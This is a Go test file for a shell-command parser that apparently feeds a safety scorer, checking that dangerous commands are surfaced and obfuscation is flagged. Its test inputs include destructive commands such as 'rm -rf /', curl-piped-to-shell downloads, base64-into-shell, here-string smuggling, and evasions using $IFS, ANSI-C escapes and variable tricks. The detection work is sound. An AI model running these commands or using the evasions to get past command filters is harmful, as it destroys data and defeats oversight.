package shellast

import "testing"

func nameOf(f Facts, i int) string {
	if i < len(f.Commands) {
		return f.Commands[i].Name
	}
	return ""
}

func TestPrefixUnwrap(t *testing.T) {
	f := Extract("sudo rm -rf /")
	if !hasCmd(f, "rm") {
		t.Fatalf("sudo not unwrapped: %+v", f.Commands)
	}
}
func argContains(f Facts, cmd, arg string) bool {
	for _, c := range f.Commands {
		if c.Name != cmd {
			continue
		}
		for _, a := range c.Args {
			if a == arg {
				return true
			}
		}
	}
	return false
}

func TestWrapperOptionValueDoesNotHideInner(t *testing.T) {
	// timeout's grammar is always DURATION then COMMAND — a naive skip picks 5.
	f := Extract("timeout 5 rm -rf /")
	if !hasCmd(f, "rm") {
		t.Fatalf("timeout wrapper hid rm: %+v", f.Commands)
	}
	if !argContains(f, "rm", "/") {
		t.Fatalf("rm target `/` not visible to scorer: %+v", f.Commands)
	}
	// sudo -u root rm: a naive skip of -u picks its value `root`.
	if !hasCmd(Extract("sudo -u root rm -rf /"), "rm") {
		t.Fatal("sudo -u root hid rm")
	}
	// nice -n 10 rm: a naive skip of -n picks its value `10`.
	if !hasCmd(Extract("nice -n 10 rm -rf /"), "rm") {
		t.Fatal("nice -n 10 hid rm")
	}
}

func TestWrapperAssignmentSkippedStillSurfacesInner(t *testing.T) {
	if !hasCmd(Extract("env X=1 rm -rf /"), "rm") {
		t.Fatal("env X=1 rm must still surface rm")
	}
}

func TestPlainCommandNotObfuscated(t *testing.T) {
	if Extract("ls -la").Obfuscated {
		t.Fatal("plain `ls -la` must not be flagged obfuscated")
	}
}

func TestIFSObfuscationFlagged(t *testing.T) {
	f := Extract("rm$IFS-rf$IFS/")
	if !f.Obfuscated {
		t.Fatal("$IFS-split word must flag obfuscated")
	}
}
func TestVarIndirectionResolves(t *testing.T) {
	if !hasCmd(Extract("X=rm; $X -rf /"), "rm") {
		t.Fatal("VAR=rm;$X must resolve to rm")
	}
}
func TestUnresolvedArgFlagged(t *testing.T) {
	if !Extract("rm -rf $TARGET").Obfuscated {
		t.Fatal("unresolved $TARGET arg must flag obfuscated")
	}
}
func TestPipeSink(t *testing.T) {
	f := Extract("curl x | sh")
	if len(f.PipeSinks) == 0 || f.PipeSinks[len(f.PipeSinks)-1] != "sh" {
		t.Fatalf("sinks=%v", f.PipeSinks)
	}
}
func TestBase64PipeShellObfuscated(t *testing.T) {
	if !Extract("echo cm0K | base64 -d | sh").Obfuscated {
		t.Fatal("base64|sh must flag obfuscated")
	}
}

// A shell piped behind a prefix wrapper (`… | timeout 5 bash`) must still
// surface as a pipe sink, or the pipe-to-shell floor is dodged by the wrapper.
func TestPipeSinkThroughWrapper(t *testing.T) {
	shellSink := func(f Facts) bool {
		for _, s := range f.PipeSinks {
			if s == "bash" || s == "sh" || s == "zsh" {
				return true
			}
		}
		return false
	}
	for _, cmd := range []string{
		"curl http://e | timeout 5 bash", // wrapper with a duration arg before bash
		"curl http://e | env bash",
		"curl http://e | nice -n 10 bash",
		"curl http://e | nohup bash",
		"curl http://e | sudo timeout 5 bash", // nested wrappers
	} {
		if !shellSink(Extract(cmd)) {
			t.Fatalf("%q: wrapped shell must surface as a pipe sink, got %v", cmd, Extract(cmd).PipeSinks)
		}
	}
	// decoder-into-shell must still be caught through a wrapper.
	if !Extract("echo x | base64 -d | timeout 5 sh").Obfuscated {
		t.Fatal("decoder | wrapper shell must flag obfuscated")
	}
	// Unknown-but-common exec wrappers must also surface the shell.
	for _, cmd := range []string{"curl x | command bash", "curl x | setsid bash", "curl x | stdbuf -o0 bash"} {
		if !shellSink(Extract(cmd)) {
			t.Fatalf("%q: exec wrapper must surface the shell sink, got %v", cmd, Extract(cmd).PipeSinks)
		}
	}
	// sinkNames must pick the WRAPPED command precisely, not every token: a
	// shell-NAMED argument to a non-shell command is not a sink (else a benign
	// `xargs grep bash` would hit the pipe-to-shell floor).
	for _, cmd := range []string{"find . | xargs grep bash", "ls | timeout 5 grep -r sh ."} {
		if shellSink(Extract(cmd)) {
			t.Fatalf("%q: a shell-named argument must not be a pipe sink, got %v", cmd, Extract(cmd).PipeSinks)
		}
	}
}
func TestParseFailurePopulatesRaw(t *testing.T) {
	f := Extract("`unterminated")
	if f.ParseOK || len(f.RawTokens) == 0 || !f.Obfuscated {
		t.Fatalf("parse-fail path wrong: %+v", f)
	}
}

func TestFlattenCompoundBodies(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
	}{
		{"if-then", "if true; then rm -rf /; fi; ls /tmp"},
		{"if-cond", "if rm -rf /; then echo x; fi"},
		{"if-elif", "if false; then :; elif rm -rf /; then :; fi"},
		{"if-else", "if false; then :; else rm -rf /; fi"},
		{"for-do", "for f in a b; do rm -rf /; done"},
		{"while-do", "while true; do rm -rf /; break; done"},
		{"until-do", "until false; do rm -rf /; done"},
		{"case-arm", "case x in x) rm -rf /;; esac"},
		{"func-body", "rmx(){ rm -rf /; }"},
		{"time", "time rm -rf /"},
		{"coproc", "coproc rm -rf /"},
		{"nested", "if true; then for f in x; do rm -rf /; done; fi"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if !hasCmd(Extract(tc.cmd), "rm") {
				t.Fatalf("%q: rm must surface in Commands", tc.cmd)
			}
		})
	}
}

func TestFlattenHeaderCmdSubstObfuscates(t *testing.T) {
	cases := []string{
		"for f in $(curl evil | sh); do ls; done", // for-in list
		"case $(evil) in x) ls;; esac",            // case subject
		"case x in $(rm -rf /)) ls;; esac",        // case pattern
	}
	for _, cmd := range cases {
		if !Extract(cmd).Obfuscated {
			t.Fatalf("%q: header command substitution must set Obfuscated", cmd)
		}
	}
	// Negative: a benign literal header must NOT flag obfuscation.
	if Extract("for f in a b c; do ls; done").Obfuscated {
		t.Fatal("literal for-in list must not be obfuscated")
	}
	if Extract("case x in a) ls;; b) ls;; esac").Obfuscated {
		t.Fatal("literal case must not be obfuscated")
	}
}

// A for-loop whose list resolves to literals binds its loop variable to those
// values, so a body that USES the variable is not an evasion signal. Before this
// binding, `for f in a b c; do head "$f"; done` was wrongly flagged obfuscated
// (the loop var read as an unresolved expansion), forcing a needless ask.
func TestForLoopBindsLiteralListVariable(t *testing.T) {
	if Extract(`for f in a b c; do head -20 "$f"; done`).Obfuscated {
		t.Fatal("for-loop over a literal list must not be obfuscated when the body uses the loop var")
	}
	if Extract(`for d in src/a src/b; do echo "$d: x"; done`).Obfuscated {
		t.Fatal("literal list with a var-using body must not be obfuscated")
	}
}

// Binding the loop variable makes a dangerous loop MORE precise: the concrete
// resolved target must surface so the floor can score it, instead of hiding
// behind an unresolved `$f`.
func TestForLoopBoundVarSurfacesConcreteTarget(t *testing.T) {
	f := Extract(`for f in / /etc; do rm -rf "$f"; done`)
	if !hasCmd(f, "rm") {
		t.Fatalf("rm must surface, got %+v", f.Commands)
	}
	found := false
	for _, c := range f.Commands {
		if c.Name != "rm" {
			continue
		}
		for _, a := range c.Args {
			if a == "/" {
				found = true
			}
		}
	}
	if !found {
		t.Fatalf("bound loop var must surface `rm -rf /` with concrete target, got %+v", f.Commands)
	}
}

// When the list itself can't be resolved, the loop's values are unknown, so a
// body reference to the loop var stays fail-closed (obfuscated).
func TestForLoopUnresolvedListStaysObfuscated(t *testing.T) {
	if !Extract(`for f in $UNKNOWN; do head "$f"; done`).Obfuscated {
		t.Fatal("unresolved for-in list must stay obfuscated")
	}
	if !Extract(`for f in a $(evil) b; do head "$f"; done`).Obfuscated {
		t.Fatal("a partially-unresolved list must stay obfuscated")
	}
}

// An EMPTY loop runs zero times, so its body assignments must NOT leak: `X=rm;
// for f in; do X=ls; done; $X -rf /` must still see the pre-loop X=rm and surface
// `rm`, matching a real shell where the never-run body leaves X=rm.
func TestForLoopEmptyBodyAssignmentDoesNotLeak(t *testing.T) {
	for _, cmd := range []string{
		`X=rm; for f in; do X=ls; done; $X -rf /`, // explicit empty list
		`X=rm; for f; do X=ls; done; $X -rf /`,    // empty "$@"
	} {
		if f := Extract(cmd); !hasCmd(f, "rm") {
			t.Fatalf("%q: empty loop must not leak X=ls; pre-loop rm must surface, got %+v", cmd, f.Commands)
		}
	}
}

// A loop that DOES run (resolved non-empty list, or a C-style loop) leaves its
// body's final assignments in scope, exactly like a real shell — so a benign
// pre-loop value reassigned to a dangerous one inside the body must surface, not
// be masked by the stale outer value. `X=ls; for f in a; do X=rm; done; $X -rf /`
// runs `rm -rf /` in bash and must here too.
func TestForLoopRunBodyAssignmentPropagates(t *testing.T) {
	for _, cmd := range []string{
		`X=ls; for f in a; do X=rm; done; $X -rf /`,          // resolved non-empty
		`X=ls; for f in a b c; do X=rm; done; $X -rf /`,      // multi-item
		`X=ls; for ((n=0;n<1;n++)); do X=rm; done; $X -rf /`, // C-style
	} {
		if f := Extract(cmd); !hasCmd(f, "rm") {
			t.Fatalf("%q: a loop that runs must propagate X=rm, got %+v", cmd, f.Commands)
		}
	}
	// The loop variable is left at its LAST value after a resolved loop (bash
	// semantics), so a later reference resolves to it.
	if !argContains(Extract(`for X in a b /etc; do :; done; rm -rf "$X"`), "rm", "/etc") {
		t.Fatal("post-loop $X must be the last list value `/etc`")
	}
}

// A C-style `for ((...))` carries no value list, so its header is not resolved
// as words — but a command substitution in the header still executes. It must
// flag obfuscation (fail closed), while a benign arithmetic header stays clean.
func TestForLoopCStyleHeaderCmdSubst(t *testing.T) {
	if !Extract(`for (( i=$(rm -rf /); i<1; i++ )); do :; done`).Obfuscated {
		t.Fatal("command substitution in a C-style for header must set Obfuscated")
	}
	if Extract(`for (( i=0; i<10; i++ )); do echo hi; done`).Obfuscated {
		t.Fatal("benign C-style for header must not be obfuscated")
	}
}

// Nested literal loops walk the body the product of the list lengths — a small
// typed payload can reach 160k walks. The total is capped: the Commands slice
// stays bounded and the truncated loop is flagged obfuscated so the untested
// remainder escalates rather than being silently dropped.
func TestForLoopNestedAmplificationCapped(t *testing.T) {
	twenty := ""
	for i := 0; i < 20; i++ {
		twenty += "x" + string(rune('a'+i)) + " "
	}
	loop := "for a in " + twenty + "; do rm -rf /tmp/x; done"
	for _, v := range []string{"b", "c", "d"} { // 20^4 unbounded
		loop = "for " + v + " in " + twenty + "; do " + loop + "; done"
	}
	f := Extract(loop)
	if len(f.Commands) > maxLoopBodyWalks {
		t.Fatalf("body walks must be capped at %d, got %d", maxLoopBodyWalks, len(f.Commands))
	}
	if !f.Obfuscated {
		t.Fatal("a truncated nested loop must be flagged obfuscated (fail closed)")
	}
	// A flat literal loop below the cap must still expand fully and stay clean.
	flat := "for f in a b c d e; do echo \"$f\"; done"
	if ff := Extract(flat); ff.Obfuscated || len(ff.Commands) != 5 {
		t.Fatalf("flat benign loop must expand fully & stay clean, got %d cmds obf=%v", len(ff.Commands), ff.Obfuscated)
	}
}

// The loop var used in COMMAND position (not just an argument) is the natural
// evasion of the binding logic: it must still surface the real command.
func TestForLoopVarAsCommandNameSurfaces(t *testing.T) {
	f := Extract(`for c in rm; do $c -rf /; done`)
	if !hasCmd(f, "rm") {
		t.Fatalf("loop var in command position must surface rm, got %+v", f.Commands)
	}
	if !argContains(f, "rm", "/") {
		t.Fatalf("rm target `/` must be visible, got %+v", f.Commands)
	}
}

// The loop var threaded into a redirect target must surface the concrete write
// target; an unresolved list keeps the target unknown and stays obfuscated.
func TestForLoopVarInRedirectTarget(t *testing.T) {
	f := Extract(`for f in /etc/passwd; do : > "$f"; done`)
	found := false
	for _, r := range f.Redirects {
		if r == "/etc/passwd" {
			found = true
		}
	}
	if !found {
		t.Fatalf("bound loop var must surface the concrete redirect target, got %v", f.Redirects)
	}
	if !Extract(`for f in $UNKNOWN; do : > "$f"; done`).Obfuscated {
		t.Fatal("unresolved list in a redirect-target loop must stay obfuscated")
	}
}

// A zero-iteration literal loop (`for x in; do ...`) never runs the body in a
// real shell; Argus still walks it once, so a dangerous verb must surface (the
// safe over-escalation direction).
func TestForLoopEmptyListStillSurfacesBody(t *testing.T) {
	if !hasCmd(Extract(`for x in; do rm -rf /; done`), "rm") {
		t.Fatal("empty-list loop body must still surface rm (fail safe)")
	}
}

// BenchmarkExtractNestedLoops guards the hot-path budget: nested literal loops
// must stay cheap after the body-walk cap. Without the cap this input reaches
// ~46ms; the cap keeps it well under the ~5ms budget.
func BenchmarkExtractNestedLoops(b *testing.B) {
	twenty := ""
	for i := 0; i < 20; i++ {
		twenty += "x" + string(rune('a'+i)) + " "
	}
	loop := "for a in " + twenty + "; do rm -rf /tmp/x; done"
	for _, v := range []string{"b", "c", "d"} {
		loop = "for " + v + " in " + twenty + "; do " + loop + "; done"
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = Extract(loop)
	}
}

// ANSI-C $'...' quoting is decoded by the shell (\xNN, \NNN, \uNNNN, \n, …);
// Argus must decode it too so an escaped verb surfaces instead of reading as a
// benign literal. `$'\x72\x6d'` is `rm`.
func TestANSICQuotingDecoded(t *testing.T) {
	for _, cmd := range []string{
		`$'\x72\x6d' -rf ~`, // hex
		`$'\162\155' -rf ~`, // octal
		`$'\x72'm -rf ~`,    // mixed with adjacent literal
	} {
		f := Extract(cmd)
		if !hasCmd(f, "rm") {
			t.Fatalf("%q: ANSI-C escape must decode to rm, got %+v", cmd, f.Commands)
		}
		if f.Obfuscated {
			t.Fatalf("%q: a decodable ANSI-C literal should resolve, not flag obfuscated", cmd)
		}
	}
	// Benign ANSI-C escapes still resolve (not obfuscated).
	if Extract(`printf '%s' $'a\tb'`).Obfuscated {
		t.Fatal("benign $'a\\tb' must not be obfuscated")
	}
	// An unrecognized escape is kept literal (bash behavior), still resolved.
	if got := decodeANSIC(`\z`); got != `\z` {
		t.Fatalf("decodeANSIC(\\z) = %q, want \\z", got)
	}
	if got := decodeANSIC(`\x72\x6d`); got != "rm" {
		t.Fatalf("decodeANSIC(hex) = %q, want rm", got)
	}
}

// A parameter expansion carrying a MODIFIER (indirect, strip, replace, slice,
// case, length) transforms the stored value; emitting the untransformed value
// would read a benign string where the shell produces a dangerous one. Every
// non-plain form must be treated as unresolved (fail closed).
func TestParamExpModifierFailsClosed(t *testing.T) {
	for _, cmd := range []string{
		`X=CMD; CMD=rm; ${!X} -rf /`,   // indirect
		`X=safe_rm; ${X/safe_/} -rf /`, // replace
		`X=foorm; ${X#foo} -rf /`,      // prefix strip
		`X=rmzz; ${X%zz} -rf /`,        // suffix strip
		`X=zzrm; ${X:2} -rf /`,         // slice
		`X=RM; ${X,,} -rf /`,           // case-mod
	} {
		if !Extract(cmd).Obfuscated {
			t.Fatalf("%q: modifier param-exp must fail closed (obfuscated)", cmd)
		}
	}
	// Plain ${X}/$X still resolve to the concrete verb (no false obfuscation).
	if !hasCmd(Extract(`X=rm; ${X} -rf /`), "rm") {
		t.Fatal("plain ${X} must resolve to rm")
	}
	if Extract(`X=rm; ${X} -rf /tmp/x`).Obfuscated {
		t.Fatal("plain ${X} must not be obfuscated")
	}
}

// A shell that reads its code from a here-string / here-doc redirect is
// smuggling executable text past argv inspection, exactly like decoder|shell.
func TestShellHereDocSmugglingObfuscates(t *testing.T) {
	for _, cmd := range []string{
		`bash <<< "rm -rf /"`,
		"sh <<EOF\nrm -rf /\nEOF\n",
		`zsh <<<'evil'`,
	} {
		if !Extract(cmd).Obfuscated {
			t.Fatalf("%q: shell reading code from a heredoc/herestring must be obfuscated", cmd)
		}
	}
	// A non-shell reading a heredoc is fine (cat is not an interpreter).
	if Extract("cat <<EOF\nhello\nEOF\n").Obfuscated {
		t.Fatal("cat <<EOF must not be obfuscated")
	}
	// A shell behind a wrapper reading a heredoc is still smuggling.
	for _, cmd := range []string{`timeout 5 bash <<<"evil"`, `env bash <<<x`, `sudo bash <<<x`} {
		if !Extract(cmd).Obfuscated {
			t.Fatalf("%q: wrapped shell heredoc must be obfuscated", cmd)
		}
	}
	if Extract("timeout 5 cat <<EOF\nx\nEOF\n").Obfuscated {
		t.Fatal("timeout cat <<EOF (non-shell) must not be obfuscated")
	}
}

// An unquoted backslash escapes the next character in the shell (`.s\sh` is
// `.ssh`), so it must be stripped or a backslash-escaped protected path resolves
// with the backslash intact and slips every path floor.
func TestUnquotedBackslashStripped(t *testing.T) {
	if got := stripUnquotedBackslashes(`.s\sh`); got != ".ssh" {
		t.Fatalf("stripUnquotedBackslashes(.s\\sh) = %q, want .ssh", got)
	}
	if got := stripUnquotedBackslashes(`a\ b`); got != "a b" {
		t.Fatalf("escaped space = %q, want 'a b'", got)
	}
	// The resolved argv surfaces the real segment.
	if !argContains(Extract(`rm -rf /home/x/.s\sh`), "rm", "/home/x/.ssh") {
		t.Fatal("escaped path must resolve to /home/x/.ssh")
	}
	// A double-quoted backslash stays literal (bash keeps it).
	if !argContains(Extract(`cat "a\sb"`), "cat", `a\sb`) {
		t.Fatal("double-quoted backslash must stay literal")
	}
}

// A select-style parameter expansion resolves when the base variable is known
// (so benign default-value idioms don't read as obfuscation), while a
// transforming modifier or an unknown base var stays fail-closed.
func TestParamExpSelectResolvesWhenKnown(t *testing.T) {
	// Known base var: default picks the var, alternate picks the word.
	if !hasCmd(Extract(`X=rm; ${X:-ls} -rf /`), "rm") {
		t.Fatal("${X:-ls} with X=rm must resolve to rm")
	}
	if Extract(`D=/tmp; cat "${D:-fallback}/f"`).Obfuscated {
		t.Fatal("a default expansion on a known var must not be obfuscated")
	}
	if !hasCmd(Extract(`X=rm; ${X:+ls} -rf /`), "ls") {
		t.Fatal("${X:+ls} with X set must resolve to the word ls")
	}
	// Unknown base var stays fail-closed (could be env-provided).
	if !Extract(`cat "${MYSTERY:-x}"`).Obfuscated {
		t.Fatal("a select expansion on an unknown var must stay obfuscated")
	}
	// Transforming modifiers stay fail-closed (H1 evasion).
	if !Extract(`X=safe_rm; ${X#safe_} -rf /`).Obfuscated {
		t.Fatal("a strip modifier must stay obfuscated")
	}
}

func TestArithmTestLetCmdSubstObfuscates(t *testing.T) {
	for _, cmd := range []string{
		"(( $(rm -rf /) ))",
		"let x=$(rm -rf /)",
		"[[ $(rm -rf /) ]]",
	} {
		if !Extract(cmd).Obfuscated {
			t.Fatalf("%q: command substitution must set Obfuscated", cmd)
		}
	}
	// Negative: plain arithmetic/test/let must stay clean.
	for _, cmd := range []string{"(( 1 + 2 ))", "[[ -f myfile ]]", "let x=1"} {
		if Extract(cmd).Obfuscated {
			t.Fatalf("%q: benign construct must not be obfuscated", cmd)
		}
	}
}

func TestRedirectAndHeredocCmdSubstObfuscates(t *testing.T) {
	if !Extract("cat < $(rm -rf /)").Obfuscated {
		t.Fatal("command substitution in a redirect target must set Obfuscated")
	}
	hdoc := "cat <<EOF\n$(rm -rf /)\nEOF\n"
	if !Extract(hdoc).Obfuscated {
		t.Fatal("command substitution in a heredoc body must set Obfuscated")
	}
	// Negative: a plain redirect/heredoc must stay clean.
	if Extract("cat < myfile").Obfuscated {
		t.Fatal("plain redirect must not be obfuscated")
	}
}
